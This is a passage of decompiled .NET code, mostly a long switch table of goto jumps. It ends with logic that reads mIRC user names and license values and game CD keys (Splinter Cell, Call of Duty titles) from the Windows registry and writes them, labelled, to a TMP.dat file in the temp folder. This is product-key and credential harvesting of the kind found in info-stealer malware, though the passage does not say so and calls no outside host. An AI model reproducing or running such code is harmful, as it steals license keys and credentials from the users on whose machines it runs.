							goto IL_1dd2;
						case 427:
							goto IL_1dec;
						case 428:
							goto IL_1dfa;
						case 429:
							goto IL_1e0d;
						case 430:
							goto IL_1e1b;
						case 431:
							goto IL_1e24;
						case 432:
							goto IL_1e42;
						case 433:
							goto IL_1e5c;
						case 434:
							goto IL_1e6a;
						case 435:
							goto IL_1e7d;
						case 436:
							goto IL_1e8b;
						case 437:
							goto IL_1e94;
						case 438:
							goto IL_1eb2;
						case 439:
							goto IL_1ecc;
						case 440:
							goto IL_1eda;
						case 441:
							goto IL_1eed;
						case 442:
							goto IL_1efb;
						case 443:
							goto IL_1f04;
						case 444:
							goto IL_1f22;
						case 445:
							goto IL_1f3c;
						case 446:
							goto IL_1f4a;
						case 447:
							goto IL_1f5d;
						case 448:
							goto IL_1f6b;
						case 449:
							goto IL_1f74;
						case 450:
							goto IL_1f92;
						case 451:
							goto IL_1fac;
						case 452:
							goto IL_1fba;
						case 453:
							goto IL_1fcd;
						case 454:
							goto IL_1fdb;
						case 455:
							goto IL_1fe4;
						case 456:
							goto IL_2002;
						case 457:
							goto IL_201c;
						case 458:
							goto IL_202a;
						case 459:
							goto IL_203d;
						case 460:
							goto IL_204b;
						case 461:
							goto IL_2054;
						case 462:
							goto IL_2072;
						case 463:
							goto IL_208c;
						case 464:
							goto IL_209a;
						case 465:
							goto IL_20ad;
						case 466:
							goto IL_20bb;
						case 467:
							goto IL_20c4;
						case 468:
							goto IL_20e2;
						case 469:
							goto IL_20fc;
						case 470:
							goto IL_210a;
						case 471:
							goto IL_211d;
						case 472:
							goto IL_212b;
						case 473:
							goto IL_2134;
						case 474:
							goto IL_2152;
						case 475:
							goto IL_216c;
						case 476:
							goto IL_217a;
						case 477:
							goto IL_218d;
						case 478:
							goto IL_219b;
						case 479:
							goto IL_21a4;
						case 480:
							goto IL_21c2;
						case 481:
							goto IL_21dc;
						case 482:
							goto IL_21ea;
						case 483:
							goto IL_21fd;
						case 484:
							goto IL_220b;
						case 485:
							goto IL_2214;
						case 486:
							goto IL_2232;
						case 487:
							goto IL_224c;
						case 488:
							goto IL_225a;
						case 489:
							goto IL_226d;
						case 490:
							goto IL_227b;
						case 491:
							goto IL_2284;
						case 492:
							goto IL_22a2;
						case 493:
							goto IL_22bc;
						case 494:
							goto IL_22ca;
						case 495:
							goto IL_22dd;
						case 496:
							goto IL_22eb;
						case 497:
							goto IL_22f4;
						case 498:
							goto IL_2312;
						case 499:
							goto IL_232c;
						case 500:
							goto IL_233a;
						case 501:
							goto IL_234d;
						case 502:
							goto IL_235b;
						case 503:
							goto IL_2364;
						case 504:
							goto IL_2382;
						case 505:
							goto IL_239c;
						case 506:
							goto IL_23aa;
						case 507:
							goto IL_23bd;
						case 508:
							goto IL_23cb;
						case 509:
							goto IL_23d4;
						case 510:
							goto IL_23f2;
						case 511:
							goto IL_240c;
						case 512:
							goto IL_241a;
						case 513:
							goto IL_242d;
						case 514:
							goto IL_243b;
						case 515:
							goto IL_2444;
						case 516:
							goto IL_2462;
						case 517:
							goto IL_247c;
						case 518:
							goto IL_248a;
						case 519:
							goto IL_249d;
						case 520:
							goto IL_24ab;
						case 521:
							goto IL_24b4;
						case 522:
							goto IL_24d2;
						case 523:
							goto IL_24ec;
						case 524:
							goto IL_24fa;
						case 525:
							goto IL_250d;
						case 526:
							goto IL_251b;
						case 527:
							goto IL_2524;
						case 528:
							goto IL_2542;
						case 529:
							goto IL_255c;
						case 530:
							goto IL_256a;
						case 531:
							goto IL_257d;
						case 532:
							goto IL_258b;
						case 533:
							goto IL_2594;
						case 534:
							goto IL_25b2;
						case 535:
							goto IL_25cc;
						case 536:
							goto IL_25da;
						case 537:
							goto IL_25ed;
						case 538:
							goto IL_25fb;
						case 539:
							goto IL_2604;
						case 540:
							goto IL_2622;
						case 541:
							goto IL_263c;
						case 542:
							goto IL_264a;
						case 543:
							goto IL_265d;
						case 544:
							goto IL_266b;
						case 545:
							goto IL_2674;
						case 546:
							goto IL_2692;
						case 547:
							goto IL_26ac;
						case 548:
							goto IL_26ba;
						case 549:
							goto IL_26cd;
						case 550:
							goto IL_26db;
						case 551:
							goto IL_26e4;
						case 552:
							goto IL_2702;
						case 553:
							goto IL_271c;
						case 554:
							goto IL_272a;
						case 555:
							goto IL_273d;
						case 556:
							goto IL_274b;
						case 557:
							goto IL_2754;
						case 558:
							goto IL_2772;
						case 559:
							goto IL_278c;
						case 560:
							goto IL_279a;
						case 561:
							goto IL_27ad;
						case 562:
							goto IL_27bb;
						case 563:
							goto IL_27c4;
						case 564:
							goto IL_27e2;
						case 565:
							goto IL_27fc;
						case 566:
							goto IL_280a;
						case 567:
							goto IL_281d;
						case 568:
							goto IL_282b;
						case 569:
							goto IL_2834;
						case 570:
							goto IL_2852;
						case 571:
							goto IL_286c;
						case 572:
							goto IL_287a;
						case 573:
							goto IL_288d;
						case 574:
							goto IL_289b;
						case 575:
							goto IL_28a4;
						case 576:
							goto IL_28c2;
						case 577:
							goto IL_28dc;
						case 578:
							goto IL_28ea;
						case 579:
							goto IL_28fd;
						case 580:
							goto IL_290b;
						case 581:
							goto IL_2914;
						case 582:
							goto IL_2932;
						case 583:
							goto IL_294c;
						case 584:
							goto IL_295a;
						case 585:
							goto IL_296d;
						case 586:
							goto IL_297b;
						case 587:
							goto IL_2984;
						case 588:
							goto IL_29a2;
						case 589:
							goto IL_29bc;
						case 590:
							goto IL_29ca;
						case 591:
							goto IL_29dd;
						case 592:
							goto IL_29eb;
						case 593:
							goto IL_29f4;
						case 594:
							goto IL_2a12;
						case 595:
							goto IL_2a2c;
						case 596:
							goto IL_2a3a;
						case 597:
							goto IL_2a4d;
						case 598:
							goto IL_2a5b;
						case 599:
							goto IL_2a64;
						case 600:
							goto IL_2a82;
						case 601:
							goto IL_2a9c;
						case 602:
							goto IL_2aaa;
						case 603:
							goto IL_2abd;
						case 604:
							goto IL_2acb;
						case 605:
							goto IL_2ad4;
						case 606:
							goto IL_2af2;
						case 607:
							goto IL_2b0c;
						case 608:
							goto IL_2b1a;
						case 609:
							goto IL_2b2d;
						case 610:
							goto IL_2b3b;
						case 611:
							goto IL_2b44;
						case 612:
							goto IL_2b62;
						case 613:
							goto IL_2b7c;
						case 614:
							goto IL_2b8a;
						case 615:
							goto IL_2b9d;
						case 616:
							goto IL_2bab;
						case 617:
							goto IL_2bb4;
						case 618:
							goto IL_2bd2;
						case 619:
							goto IL_2bec;
						case 620:
							goto IL_2bfa;
						case 621:
							goto IL_2c0d;
						case 622:
							goto IL_2c1b;
						case 623:
							goto IL_2c24;
						case 624:
							goto IL_2c42;
						case 625:
							goto IL_2c5c;
						case 626:
							goto IL_2c6a;
						case 627:
							goto IL_2c7d;
						case 628:
							goto IL_2c8b;
						case 629:
							goto IL_2c94;
						case 630:
							goto IL_2cb2;
						case 631:
							goto IL_2ccc;
						case 632:
							goto IL_2cda;
						case 633:
							goto IL_2ced;
						case 634:
							goto IL_2cfb;
						case 635:
							goto IL_2d04;
						case 636:
							goto IL_2d22;
						case 637:
							goto IL_2d3c;
						case 638:
							goto IL_2d4a;
						case 639:
							goto IL_2d5d;
						case 640:
							goto IL_2d6b;
						case 641:
							goto IL_2d74;
						case 642:
							goto IL_2d92;
						case 643:
							goto IL_2dac;
						case 644:
							goto IL_2dba;
						case 645:
							goto IL_2dcd;
						case 646:
							goto IL_2ddb;
						case 647:
							goto IL_2de4;
						case 648:
							goto IL_2e02;
						case 649:
							goto IL_2e1c;
						case 650:
							goto IL_2e2a;
						case 651:
							goto IL_2e3d;
						case 652:
							goto IL_2e4b;
						case 653:
							goto IL_2e54;
						case 654:
							goto IL_2e72;
						case 655:
							goto IL_2e8c;
						case 656:
							goto IL_2e9a;
						case 657:
							goto IL_2ead;
						case 658:
							goto IL_2ebb;
						case 659:
							goto IL_2ec4;
						case 660:
							goto IL_2ee2;
						case 661:
							goto IL_2efc;
						case 662:
							goto IL_2f0a;
						case 663:
							goto IL_2f1d;
						case 664:
							goto IL_2f2b;
						case 665:
							goto IL_2f34;
						case 666:
							goto IL_2f52;
						case 667:
							goto IL_2f6c;
						case 668:
							goto IL_2f7a;
						case 669:
							goto IL_2f8d;
						case 670:
							goto IL_2f9b;
						case 671:
							goto IL_2fa4;
						case 672:
							goto IL_2fc2;
						case 673:
							goto IL_2fdc;
						case 674:
							goto IL_2fea;
						case 675:
							goto IL_2ffd;
						case 676:
							goto IL_300b;
						case 677:
							goto IL_3014;
						case 678:
							goto IL_3032;
						case 679:
							goto IL_304c;
						case 680:
							goto IL_305a;
						case 681:
							goto IL_306d;
						case 682:
							goto IL_307b;
						case 683:
							goto IL_3084;
						case 684:
							goto IL_30a2;
						case 685:
							goto IL_30bc;
						case 686:
							goto IL_30ca;
						case 687:
							goto IL_30dd;
						case 688:
							goto IL_30eb;
						case 689:
							goto IL_30f4;
						case 690:
							goto IL_3112;
						case 691:
							goto IL_312c;
						case 692:
							goto IL_313a;
						case 693:
							goto IL_314d;
						case 694:
							goto IL_315b;
						case 695:
							goto IL_3164;
						case 696:
							goto IL_3182;
						case 697:
							goto IL_319c;
						case 698:
							goto IL_31aa;
						case 699:
							goto IL_31bd;
						case 700:
							goto IL_31cb;
						case 701:
							goto IL_31d4;
						case 702:
							goto IL_31f2;
						case 703:
							goto IL_320c;
						case 704:
							goto IL_321a;
						case 705:
							goto IL_322d;
						case 706:
							goto IL_323b;
						case 707:
							goto IL_3244;
						case 708:
							goto IL_3262;
						case 709:
							goto IL_327c;
						case 710:
							goto IL_328a;
						case 711:
							goto IL_329d;
						case 712:
							goto IL_32ab;
						case 713:
							goto IL_32b4;
						case 714:
							goto IL_32d2;
						case 715:
							goto IL_32ec;
						case 716:
							goto IL_32fa;
						case 717:
							goto IL_330d;
						case 718:
							goto IL_331b;
						case 719:
							goto IL_3324;
						case 720:
							goto IL_3342;
						case 721:
							goto IL_335c;
						case 722:
							goto IL_336a;
						case 723:
							goto IL_337d;
						case 724:
							goto IL_338b;
						case 725:
							goto IL_3394;
						case 726:
							goto IL_33b2;
						case 727:
							goto IL_33cc;
						case 728:
							goto IL_33da;
						case 729:
							goto IL_33ed;
						case 730:
							goto IL_33fb;
						case 731:
							goto IL_3404;
						case 732:
							goto IL_3422;
						case 733:
							goto IL_343c;
						case 734:
							goto IL_344a;
						case 735:
							goto IL_345d;
						case 736:
							goto IL_346b;
						case 737:
							goto IL_3474;
						case 738:
							goto IL_3492;
						case 739:
							goto IL_34ac;
						case 740:
							goto IL_34ba;
						case 741:
							goto IL_34cd;
						case 742:
							goto IL_34db;
						case 743:
							goto IL_34e4;
						case 744:
							goto IL_3502;
						case 745:
							goto IL_351c;
						case 746:
							goto IL_352a;
						case 747:
							goto IL_353d;
						case 748:
							goto IL_354b;
						case 749:
							goto IL_3554;
						case 750:
							goto IL_3572;
						case 751:
							goto IL_358c;
						case 752:
							goto IL_359a;
						case 753:
							goto IL_35ad;
						case 754:
							goto IL_35bb;
						case 755:
							goto IL_35c7;
						case 756:
							goto IL_35e5;
						case 757:
							goto IL_35ff;
						case 758:
							goto IL_360d;
						case 759:
							goto IL_3620;
						case 760:
							goto IL_362e;
						case 761:
							goto IL_363a;
						case 762:
							goto IL_3658;
						case 763:
							goto IL_3672;
						case 764:
							goto IL_3680;
						case 765:
							goto IL_3693;
						case 766:
							goto IL_36a1;
						case 767:
							goto IL_36ad;
						case 768:
							goto IL_36cb;
						case 769:
							goto IL_36e5;
						case 770:
							goto IL_36f3;
						case 771:
							goto IL_3706;
						case 772:
							goto IL_3714;
						case 773:
							goto IL_3720;
						case 774:
							goto IL_373e;
						case 775:
							goto IL_3758;
						case 776:
							goto IL_3766;
						case 777:
							goto IL_3779;
						case 778:
							goto IL_3787;
						case 779:
							goto IL_3793;
						case 780:
							goto IL_37b1;
						case 781:
							goto IL_37cb;
						case 782:
							goto IL_37d9;
						case 783:
							goto IL_37ec;
						case 784:
							goto IL_37fa;
						case 785:
							goto IL_3806;
						case 786:
							goto IL_3824;
						case 787:
							goto IL_383e;
						case 788:
							goto IL_384c;
						case 789:
							goto IL_385f;
						case 790:
							goto IL_386d;
						case 791:
							goto IL_3879;
						case 792:
							goto IL_3897;
						case 793:
							goto IL_38b1;
						case 794:
							goto IL_38bf;
						case 795:
							goto IL_38d2;
						case 796:
							goto IL_38e0;
						case 797:
							goto IL_38ec;
						case 798:
							goto IL_390a;
						case 799:
							goto IL_3924;
						case 800:
							goto IL_3932;
						case 801:
							goto IL_3945;
						case 802:
							goto IL_3953;
						case 803:
							goto IL_395f;
						case 804:
							goto IL_397d;
						case 805:
							goto IL_3997;
						case 806:
							goto IL_39a5;
						case 807:
							goto IL_39b8;
						case 808:
							goto IL_39c6;
						case 809:
							goto IL_39d2;
						case 810:
							goto IL_39f0;
						case 811:
							goto IL_3a0a;
						case 812:
							goto IL_3a18;
						case 813:
							goto IL_3a2b;
						case 814:
							goto IL_3a39;
						case 815:
							goto IL_3a45;
						case 816:
							goto IL_3a63;
						case 817:
							goto IL_3a7d;
						case 818:
							goto IL_3a8b;
						case 819:
							goto IL_3a9e;
						case 820:
							goto IL_3aac;
						case 821:
							goto IL_3ab8;
						case 822:
							goto IL_3ad6;
						case 823:
							goto IL_3af0;
						case 824:
							goto IL_3afe;
						case 825:
							goto IL_3b11;
						case 826:
							goto IL_3b1f;
						case 827:
							goto IL_3b2b;
						case 828:
							goto IL_3b49;
						case 829:
							goto IL_3b63;
						case 830:
							goto IL_3b71;
						case 831:
							goto IL_3b84;
						case 832:
							goto IL_3b92;
						case 833:
							goto IL_3b9e;
						case 834:
							goto IL_3bbc;
						case 835:
							goto IL_3bd6;
						case 836:
							goto IL_3be4;
						case 837:
							goto IL_3bf7;
						case 838:
							goto IL_3c05;
						case 839:
							goto IL_3c11;
						case 840:
							goto IL_3c2f;
						case 841:
							goto IL_3c49;
						case 842:
							goto IL_3c57;
						case 843:
							goto IL_3c6a;
						case 844:
							goto IL_3c78;
						case 845:
							goto IL_3c84;
						case 846:
							goto IL_3ca2;
						case 847:
							goto IL_3cbc;
						case 848:
							goto IL_3cca;
						case 849:
							goto IL_3cdd;
						case 850:
							goto IL_3ceb;
						case 851:
							goto IL_3cf7;
						case 852:
							goto IL_3d15;
						case 853:
							goto IL_3d2f;
						case 854:
							goto IL_3d3d;
						case 855:
							goto IL_3d50;
						case 856:
							goto IL_3d5e;
						case 857:
							goto IL_3d6a;
						case 858:
							goto IL_3d88;
						case 859:
							goto IL_3da2;
						case 860:
							goto IL_3db0;
						case 861:
							goto IL_3dc3;
						case 862:
							goto IL_3dd1;
						case 863:
							goto IL_3ddd;
						case 864:
							goto IL_3dfb;
						case 865:
							goto IL_3e15;
						case 866:
							goto IL_3e23;
						case 867:
							goto IL_3e36;
						case 868:
							goto IL_3e44;
						case 869:
							goto IL_3e50;
						case 870:
							goto IL_3e6e;
						case 871:
							goto IL_3e88;
						case 872:
							goto IL_3e96;
						case 873:
							goto IL_3ea9;
						case 874:
							goto IL_3eb7;
						case 875:
							goto IL_3ec3;
						case 876:
							goto IL_3ee1;
						case 877:
							goto IL_3efb;
						case 878:
							goto IL_3f09;
						case 879:
							goto IL_3f1c;
						case 880:
							goto IL_3f2a;
						case 881:
							goto IL_3f36;
						case 882:
							goto IL_3f54;
						case 883:
							goto IL_3f6e;
						case 884:
							goto IL_3f7c;
						case 885:
							goto IL_3f8f;
						case 886:
							goto IL_3f9d;
						case 887:
							goto IL_3fa9;
						case 888:
							goto IL_3fc7;
						case 889:
							goto IL_3fe1;
						case 890:
							goto IL_3fef;
						case 891:
							goto IL_4002;
						case 892:
							goto IL_4010;
						case 893:
							goto IL_401c;
						case 894:
							goto IL_403a;
						case 895:
							goto IL_4054;
						case 896:
							goto IL_4062;
						case 897:
							goto IL_4075;
						case 898:
							goto IL_4083;
						case 899:
							goto IL_408f;
						case 900:
							goto IL_40ad;
						case 901:
							goto IL_40c7;
						case 902:
							goto IL_40d5;
						case 903:
							goto IL_40e8;
						case 904:
							goto IL_40f6;
						case 905:
							goto IL_4102;
						case 906:
							goto IL_4120;
						case 907:
							goto IL_413a;
						case 908:
							goto IL_4148;
						case 909:
							goto IL_415b;
						case 910:
							goto IL_4169;
						case 911:
							goto IL_4175;
						case 912:
							goto IL_4193;
						case 913:
							goto IL_41ad;
						case 914:
							goto IL_41bb;
						case 915:
							goto IL_41ce;
						case 916:
							goto IL_41dc;
						case 917:
							goto IL_41e8;
						case 918:
							goto IL_4206;
						case 919:
							goto IL_4220;
						case 920:
							goto IL_422e;
						case 921:
							goto IL_4241;
						case 922:
							goto IL_424f;
						case 923:
							goto IL_425b;
						case 924:
							goto IL_4279;
						case 925:
							goto IL_4293;
						case 926:
							goto IL_42a1;
						case 927:
							goto IL_42b4;
						case 928:
							goto IL_42c2;
						case 929:
							goto IL_42ce;
						case 930:
							goto IL_42ec;
						case 931:
							goto IL_4306;
						case 932:
							goto IL_4314;
						case 933:
							goto IL_4327;
						case 934:
							goto IL_4335;
						case 935:
							goto IL_4341;
						case 936:
							goto IL_435f;
						case 937:
							goto IL_4379;
						case 938:
							goto IL_4387;
						case 939:
							goto IL_439a;
						case 940:
							goto IL_43a8;
						case 941:
							goto IL_43b4;
						case 942:
							goto IL_43d2;
						case 943:
							goto IL_43ec;
						case 944:
							goto IL_43fa;
						case 945:
							goto IL_440d;
						case 946:
							goto IL_441b;
						case 947:
							goto IL_4427;
						case 948:
							goto IL_4445;
						case 949:
							goto IL_445f;
						case 950:
							goto IL_446d;
						case 951:
							goto IL_4480;
						case 952:
							goto IL_448e;
						case 953:
							goto IL_449a;
						case 954:
							goto IL_44b8;
						case 955:
							goto IL_44d2;
						case 956:
							goto IL_44e0;
						case 957:
							goto IL_44f3;
						case 958:
							goto IL_4501;
						case 959:
							goto IL_450d;
						case 960:
							goto IL_452b;
						case 961:
							goto IL_4545;
						case 962:
							goto IL_4553;
						case 963:
							goto IL_4566;
						case 964:
							goto IL_4574;
						case 965:
							goto IL_4580;
						case 966:
							goto IL_459e;
						case 967:
							goto IL_45b8;
						case 968:
							goto IL_45c6;
						case 969:
							goto IL_45d9;
						case 970:
							goto IL_45e7;
						case 971:
							goto IL_45f3;
						case 972:
							goto IL_4611;
						case 973:
							goto IL_462b;
						case 974:
							goto IL_4639;
						case 975:
							goto IL_464c;
						case 976:
							goto IL_465a;
						case 977:
							goto IL_4666;
						case 978:
							goto IL_4684;
						case 979:
							goto IL_469e;
						case 980:
							goto IL_46ac;
						case 981:
							goto IL_46bf;
						case 982:
							goto IL_46cd;
						case 983:
							goto IL_46d9;
						case 984:
							goto IL_46f7;
						case 985:
							goto IL_4711;
						case 986:
							goto IL_471f;
						case 987:
							goto IL_4732;
						case 988:
							goto IL_4740;
						case 989:
							goto IL_474c;
						case 990:
							goto IL_476a;
						case 991:
							goto IL_4784;
						case 992:
							goto IL_4792;
						case 993:
							goto IL_47a5;
						case 994:
							goto IL_47b3;
						case 995:
							goto IL_47bf;
						case 996:
							goto IL_47dd;
						case 997:
							goto IL_47f7;
						case 998:
							goto IL_4805;
						case 999:
							goto IL_4818;
						case 1000:
							goto IL_4826;
						case 1001:
							goto IL_4832;
						case 1002:
							goto IL_4850;
						case 1003:
							goto IL_486a;
						case 1004:
							goto IL_4878;
						case 1005:
							goto IL_488b;
						case 1006:
							goto IL_4899;
						case 1007:
							goto IL_48a5;
						case 1008:
							goto IL_48c3;
						case 1009:
							goto IL_48dd;
						case 1010:
							goto IL_48eb;
						case 1011:
							goto IL_48fe;
						case 1012:
							goto IL_490c;
						case 1013:
							goto IL_4918;
						case 1014:
							goto IL_4936;
						case 1015:
							goto IL_4950;
						case 1016:
							goto IL_495e;
						case 1017:
							goto IL_4971;
						case 1018:
							goto IL_497f;
						case 1019:
							goto IL_498b;
						case 1020:
							goto IL_49a9;
						case 1021:
							goto IL_49c3;
						case 1022:
							goto IL_49d1;
						case 1023:
							goto IL_49e4;
						case 1024:
							goto IL_49f2;
						case 1025:
							goto IL_49fe;
						case 1026:
							goto IL_4a1c;
						case 1027:
							goto IL_4a36;
						case 1028:
							goto IL_4a44;
						case 1029:
							goto IL_4a57;
						case 1030:
							goto IL_4a65;
						case 1031:
							goto IL_4a71;
						case 1032:
							goto IL_4a8f;
						case 1033:
							goto IL_4aa9;
						case 1034:
							goto IL_4ab7;
						case 1035:
							goto IL_4aca;
						case 1036:
							goto IL_4ad8;
						case 1037:
							goto IL_4ae4;
						case 1038:
							goto IL_4b02;
						case 1039:
							goto IL_4b1c;
						case 1040:
							goto IL_4b2a;
						case 1041:
							goto IL_4b3d;
						case 1042:
							goto IL_4b4b;
						case 1043:
							goto IL_4b57;
						case 1044:
							goto IL_4b75;
						case 1045:
							goto IL_4b8f;
						case 1046:
							goto IL_4b9d;
						case 1047:
							goto IL_4bb0;
						case 1048:
							goto IL_4bbe;
						case 1049:
							goto IL_4bca;
						case 1050:
							goto IL_4be8;
						case 1051:
							goto IL_4c02;
						case 1052:
							goto IL_4c10;
						case 1053:
							goto IL_4c23;
						case 1054:
							goto IL_4c31;
						case 1055:
							goto IL_4c3d;
						case 1056:
							goto IL_4c5b;
						case 1057:
							goto IL_4c75;
						case 1058:
							goto IL_4c83;
						case 1059:
							goto IL_4c96;
						case 1060:
							goto IL_4ca4;
						case 1061:
							goto IL_4cb0;
						case 1062:
							goto IL_4cce;
						case 1063:
							goto IL_4ce8;
						case 1064:
							goto IL_4cf6;
						case 1065:
							goto IL_4d09;
						case 1066:
							goto IL_4d17;
						case 1067:
							goto IL_4d23;
						case 1068:
							goto IL_4d41;
						case 1069:
							goto IL_4d5b;
						case 1070:
							goto IL_4d69;
						case 1071:
							goto IL_4d7c;
						case 1072:
							goto IL_4d8a;
						case 1073:
							goto IL_4d96;
						case 1074:
							goto IL_4db4;
						case 1075:
							goto IL_4dce;
						case 1076:
							goto IL_4ddc;
						case 1077:
							goto IL_4def;
						case 1078:
							goto IL_4dfd;
						case 1079:
							goto IL_4e09;
						case 1080:
							goto IL_4e2b;
						case 1081:
							goto IL_4e45;
						case 1082:
							goto IL_4e53;
						case 1083:
							goto IL_4e66;
						case 1084:
							goto IL_4e74;
						case 1085:
							goto IL_4e80;
						case 1086:
							goto IL_4ea2;
						case 1087:
							goto IL_4ebc;
						case 1088:
							goto IL_4eca;
						case 1089:
							goto IL_4edd;
						case 1090:
							goto IL_4eeb;
						case 1091:
							goto IL_4ef7;
						case 1092:
							goto IL_4f19;
						case 1093:
							goto IL_4f33;
						case 1094:
							goto IL_4f41;
						case 1095:
							goto IL_4f54;
						case 1096:
							goto IL_4f62;
						case 1097:
							goto IL_4f6e;
						case 1098:
							goto IL_4f90;
						case 1099:
							goto IL_4faa;
						case 1100:
							goto IL_4fb8;
						case 1101:
							goto IL_4fcb;
						case 1102:
							goto IL_4fd9;
						case 1103:
							goto IL_4fe5;
						case 1104:
							goto IL_5007;
						case 1105:
							goto IL_5021;
						case 1106:
							goto IL_502f;
						case 1107:
							goto IL_5042;
						case 1108:
							goto IL_5050;
						case 1109:
							goto IL_505c;
						case 1110:
							goto IL_507e;
						case 1111:
							goto IL_5098;
						case 1112:
							goto IL_50a6;
						case 1113:
							goto IL_50b9;
						case 1114:
							goto IL_50c7;
						case 1115:
							goto IL_50d3;
						case 1116:
							goto IL_50f5;
						case 1117:
							goto IL_510f;
						case 1118:
							goto IL_511d;
						case 1119:
							goto IL_5130;
						case 1120:
							goto IL_513e;
						case 1121:
							goto IL_514a;
						case 1122:
							goto IL_516c;
						case 1123:
							goto IL_5186;
						case 1124:
							goto IL_5194;
						case 1125:
							goto IL_51a7;
						case 1126:
							goto IL_51b5;
						case 1127:
							goto IL_51c1;
						case 1128:
							goto IL_51e3;
						case 1129:
							goto IL_51fd;
						case 1130:
							goto IL_520b;
						case 1131:
							goto IL_521e;
						case 1132:
							goto IL_522c;
						case 1133:
							goto IL_5238;
						case 1134:
							goto IL_525a;
						case 1135:
							goto IL_5274;
						case 1136:
							goto IL_5282;
						case 1137:
							goto IL_5295;
						case 1138:
							goto IL_52a3;
						case 1139:
							goto IL_52af;
						case 1140:
							goto IL_52d1;
						case 1141:
							goto IL_52eb;
						case 1142:
							goto IL_52f9;
						case 1143:
							goto IL_530c;
						case 1144:
							goto IL_531a;
						case 1145:
							goto IL_5326;
						case 1146:
							goto IL_5348;
						case 1147:
							goto IL_5362;
						case 1148:
							goto IL_5370;
						case 1149:
							goto IL_5383;
						case 1150:
							goto IL_5391;
						case 1151:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 1152:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_5391:
					num = 1150;
					streamWriter.Flush();
					break;
					IL_5383:
					num = 1149;
					streamWriter.Flush();
					goto IL_5391;
					IL_0009:
					num = 2;
					streamWriter = new StreamWriter(Interaction.Environ("tmp") + "\\TMP.dat");
					goto IL_0027;
					IL_0027:
					ProjectData.ClearProjectError();
					num3 = -3;
					goto IL_0030;
					IL_0030:
					num = 4;
					text = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\mIRC\\UserName", string.Empty, null));
					goto IL_004a;
					IL_004a:
					num = 5;
					streamWriter.WriteLine("mIRC Username : " + text);
					goto IL_0060;
					IL_0060:
					num = 6;
					streamWriter.Flush();
					goto IL_006a;
					IL_006a:
					ProjectData.ClearProjectError();
					num3 = -4;
					goto IL_0073;
					IL_0073:
					num = 8;
					text2 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\mIRC\\License", string.Empty, null));
					goto IL_008d;
					IL_008d:
					num = 9;
					streamWriter.WriteLine("mIRC Pass : " + text2);
					goto IL_00a4;
					IL_00a4:
					num = 10;
					streamWriter.WriteLine(string.Empty);
					goto IL_00b4;
					IL_00b4:
					num = 11;
					streamWriter.Flush();
					goto IL_00bf;
					IL_00bf:
					ProjectData.ClearProjectError();
					num3 = -5;
					goto IL_00c8;
					IL_00c8:
					num = 13;
					text3 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ubisoft\\Splinter Cell Pandora Tomorrow", "CDKey", null));
					goto IL_00e2;
					IL_00e2:
					num = 14;
					streamWriter.WriteLine("Splinter Cell Pandora Tomorrow : " + text3);
					goto IL_00f8;
					IL_00f8:
					num = 15;
					streamWriter.WriteLine(string.Empty);
					goto IL_0108;
					IL_0108:
					num = 16;
					streamWriter.Flush();
					goto IL_0113;
					IL_0113:
					ProjectData.ClearProjectError();
					num3 = -6;
					goto IL_011c;
					IL_011c:
					num = 18;
					text4 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ubisoft\\Splinter Cell Chaos Theory\\Keys", "DiscKey_SCCT", null));
					goto IL_0136;
					IL_0136:
					num = 19;
					streamWriter.WriteLine("Splinter Cell Chaos Theory :" + text4);
					goto IL_014c;
					IL_014c:
					num = 20;
					streamWriter.Flush();
					goto IL_0157;
					IL_0157:
					num = 21;
					streamWriter.WriteLine(string.Empty);
					goto IL_0167;
					IL_0167:
					num = 22;
					streamWriter.Flush();
					goto IL_0172;
					IL_0172:
					ProjectData.ClearProjectError();
					num3 = -7;
					goto IL_017b;
					IL_017b:
					num = 24;
					text5 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty", "codkey", null));
					goto IL_0195;
					IL_0195:
					num = 25;
					streamWriter.WriteLine("Call of Duty : " + text5);
					goto IL_01ab;
					IL_01ab:
					num = 26;
					streamWriter.Flush();
					goto IL_01b6;
					IL_01b6:
					num = 27;
					streamWriter.WriteLine(string.Empty);
					goto IL_01c6;
					IL_01c6:
					num = 28;
					streamWriter.Flush();
					goto IL_01d1;
					IL_01d1:
					ProjectData.ClearProjectError();
					num3 = -8;
					goto IL_01da;
					IL_01da:
					num = 30;
					text6 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty United Offensive", "key", null));
					goto IL_01f5;
					IL_01f5:
					num = 31;
					streamWriter.WriteLine("Call of Duty United Offensive : " + text6);
					goto IL_020c;
					IL_020c:
					num = 32;
					streamWriter.Flush();
					goto IL_0217;
					IL_0217:
					num = 33;
					streamWriter.WriteLine(string.Empty);
					goto IL_0227;
					IL_0227:
					num = 34;
					streamWriter.Flush();
					goto IL_0232;
					IL_0232:
					ProjectData.ClearProjectError();
					num3 = -9;
					goto IL_023b;
					IL_023b:
					num = 36;
					text7 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty 2", "codkey", null));
					goto IL_0256;
					IL_0256:
					num = 37;
					streamWriter.WriteLine("Call of Duty 2 : " + text7);
					goto IL_026d;
					IL_026d:
					num = 38;
					streamWriter.Flush();
					goto IL_0278;
					IL_0278:
					num = 39;
					streamWriter.WriteLine(string.Empty);
					goto IL_0288;
					IL_0288:
					num = 40;
					streamWriter.Flush();
					goto IL_0293;
					IL_0293:
					ProjectData.ClearProjectError();
					num3 = -10;
					goto IL_029c;
					IL_029c:
					num = 42;
					text8 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty 4", "codkey", null));
					goto IL_02b7;
					IL_02b7:
					num = 43;
					streamWriter.WriteLine("Call of Duty 4 : " + text8);
					goto IL_02ce;
					IL_02ce:
					num = 44;
					streamWriter.Flush();
					goto IL_02d9;
					IL_02d9:
					num = 45;
					streamWriter.WriteLine(string.Empty);
					goto IL_02e9;
					IL_02e9:
					num = 46;
					streamWriter.Flush();
					goto IL_02f4;
					IL_02f4:
					ProjectData.ClearProjectError();
					num3 = -11;
					goto IL_02fd;
					IL_02fd:
					num = 48;
